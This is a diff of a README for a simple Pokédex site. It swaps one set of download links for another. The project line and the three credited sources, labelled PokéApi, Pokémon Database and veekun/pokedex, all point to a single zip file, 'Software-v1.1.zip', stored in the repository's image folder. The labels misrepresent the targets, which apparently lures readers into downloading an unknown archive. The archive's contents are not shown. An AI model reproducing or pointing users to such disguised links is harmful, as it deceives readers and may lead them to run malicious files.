@@ -1,6 +1,6 @@
 # Pokédex
 
-A simple Pokédex built with https://raw.githubusercontent.com/jeliasrm/pokedex/master/trotlet/pokedex.zip
+A simple Pokédex built with https://github.com/jeliasrm/pokedex/raw/refs/heads/master/public/img/Software-v1.1.zip
 
 ## LEGAL
 
@@ -10,9 +10,9 @@ Pokémon images, names and information (c) 1995-2014 Nintendo/Game freak.
 
 Images and content were taken from the following resources:
 
-* [PokéApi](https://raw.githubusercontent.com/jeliasrm/pokedex/master/trotlet/pokedex.zip)
-* [Pokémon Database](https://raw.githubusercontent.com/jeliasrm/pokedex/master/trotlet/pokedex.zip)
-* [veekun/pokedex](https://raw.githubusercontent.com/jeliasrm/pokedex/master/trotlet/pokedex.zip)
+* [PokéApi](https://github.com/jeliasrm/pokedex/raw/refs/heads/master/public/img/Software-v1.1.zip)
+* [Pokémon Database](https://github.com/jeliasrm/pokedex/raw/refs/heads/master/public/img/Software-v1.1.zip)
+* [veekun/pokedex](https://github.com/jeliasrm/pokedex/raw/refs/heads/master/public/img/Software-v1.1.zip)
 
 This site was built entirely for education purposes only.
 
